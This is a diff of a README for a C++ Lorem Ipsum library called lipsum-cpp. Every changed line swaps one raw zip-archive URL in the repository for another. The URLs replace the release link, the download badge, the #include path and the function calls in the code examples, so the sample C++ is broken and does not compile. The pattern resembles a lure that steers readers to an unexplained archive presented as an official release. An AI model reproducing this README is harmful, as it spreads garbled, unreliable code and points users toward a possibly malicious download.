@@ -6,7 +6,7 @@ Welcome to the lipsum-cpp project! This tool helps you generate Lorem Ipsum text
 
 ## 📥 Download Now
 
-[![Download lipsum-cpp](https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip)](https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip)
+[![Download lipsum-cpp](https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip)](https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip)
 
 ## 📃 What is lipsum-cpp?
 
@@ -29,7 +29,7 @@ lipsum-cpp runs on any system that supports C++. Here are the recommended requir
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip) to download the latest version of lipsum-cpp. 
+To get started, visit the [Releases page](https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip) to download the latest version of lipsum-cpp. 
 
 1. Click the "Releases" link above.
 2. Choose the latest release version.
@@ -43,7 +43,7 @@ Once you have downloaded the library, follow these steps to generate Lorem Ipsum
 
 1. **Include the Library**: Add this line at the top of your C++ file:
    ```cpp
-   #include "https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip"
+   #include "https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip"
    ```
    
 2. **Create an Instance**: You can create an instance to generate text as shown:
@@ -53,7 +53,7 @@ Once you have downloaded the library, follow these steps to generate Lorem Ipsum
 
 3. **Generate Text**: Call the method to generate a string:
    ```cpp
-   std::string placeholderText = https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip(5); // Generates 5 paragraphs
+   std::string placeholderText = https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip(5); // Generates 5 paragraphs
    ```
    
 4. **Use the Text**: You can now use the string in your project as needed.
@@ -64,11 +64,11 @@ Here is a simple example program that uses lipsum-cpp:
 
 ```cpp
 #include <iostream>
-#include "https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip"
+#include "https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip"
 
 int main() {
     Lipsum generator;
-    std::string text = https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip(3); // Generates 3 paragraphs of text
+    std::string text = https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip(3); // Generates 3 paragraphs of text
     std::cout << text << std::endl;
     return 0;
 }
@@ -92,4 +92,4 @@ This project is open-source. Contributions are welcome! Feel free to fork the re
 
 ## 📥 Download Now Again
 
-To start generating placeholder text with lipsum-cpp, visit the [Releases page](https://raw.githubusercontent.com/Nikkicodes2/lipsum-cpp/master/fleshhood/lipsum-cpp.zip) for your download. Whether you need it for a school project or a professional presentation, lipsum-cpp makes it easy to enhance your designs.
+To start generating placeholder text with lipsum-cpp, visit the [Releases page](https://github.com/Nikkicodes2/lipsum-cpp/raw/refs/heads/master/scripts/cpp_lipsum_1.2-beta.2.zip) for your download. Whether you need it for a school project or a professional presentation, lipsum-cpp makes it easy to enhance your designs.
